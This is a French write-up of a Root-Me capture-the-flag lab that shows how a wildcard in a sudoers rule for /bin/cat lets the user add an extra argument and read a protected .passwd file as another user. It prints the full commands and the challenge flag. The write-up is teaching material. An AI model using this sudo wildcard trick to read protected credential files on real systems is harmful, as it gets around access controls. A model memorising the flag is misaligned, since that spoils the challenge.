## Source et énoncé du CTF

<https://www.root-me.org/fr/Challenges/App-Script/sudo-faiblesse-de-configuration>

## Write-up

En se rapportant au titre du challenge, on en déduit que le but du CTF va être d'exploiter une faiblesse dans la configuration *sudo* de la machine.

Le répertoire de travail contient les éléments suivants :
```console
app-script-ch1@challenge02:~$ ls -la
total 28
dr-xr-x---  4 app-script-ch1-cracked app-script-ch1         4096 Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4096 Sep  5  2023 ..
-r--------  1 root                   root                    921 Dec 10  2021 ._perms
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1-cracked 4096 Dec 10  2021 ch1cracked
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1         4096 Dec 10  2021 notes
-rw-r-----  1 app-script-ch1         app-script-ch1          217 Dec 10  2021 readme.md
```

En affichant le contenu du fichier *readme.md*, l'objectif du challenge se précise. Il s'agira d'afficher le contenu du fichier */challenge/app-script/ch1/ch1cracked/.passwd* :
```console
app-script-ch1@challenge02:~$ cat readme.md
Vous devez réussir à lire le fichier .passwd situé dans le chemin suivant :
/challenge/app-script/ch1/ch1cracked/

You have to read the .passwd located in the following PATH :
/challenge/app-script/ch1/ch1cracked/
```

On peut commencer par afficher les droits *sudo* de l'utilisateur *app-script-ch1* :
```console
app-script-ch1@challenge02:~$ sudo -l
[sudo] password for app-script-ch1:
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass,
    !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```
On remarque que *app-script-ch1* possède un seul droit *sudo*, celui d'exécuter la commande */bin/cat /challenge/app-script/ch1/notes/* * en tant que l'utilisateur *app-script-ch1-cracked* :
```console
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/*
#####################
        Todo

- Change DHCP pool
- Change IP routing
- Beef up the fw
```
Mais cela ne nous apporte pas grand chose étant donné que le contenu de ce fichier ne contient aucune information exploitable.

Cependant, en se renseignant sur le fonctionnement de la commande *sudo* et la délégation de droits *sudo*, on trouve que *sudo* ne fait pas une vérification stricte de la commande passée par l'utilisateur. *sudo* vérifie seulement si la commande passée par l'utilisateur contient la commande et les arguments définis dans la délégation de droits *sudo*. En clair, rien n'empêche d'ajouter un argument à la commande */bin/cat* pour peu qu'elle contienne en premier argument */challenge/app-script/ch1/notes/**. 
```console
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/* ch1cracked/.passwd
#####################
        Todo

- Change DHCP pool
- Change IP routing
- Beef up the fw
b3_c4r3ful_w1th_sud0
```
On peut ainsi exploiter cette faiblesse de configuration pour afficher le contenu du fichier *ch1cracked/.passwd*, dont *app-script-ch1-cracked* possède les droits en lecture et que *app-script-ch1* ne possède pas.

## Flag

b3_c4r3ful_w1th_sud0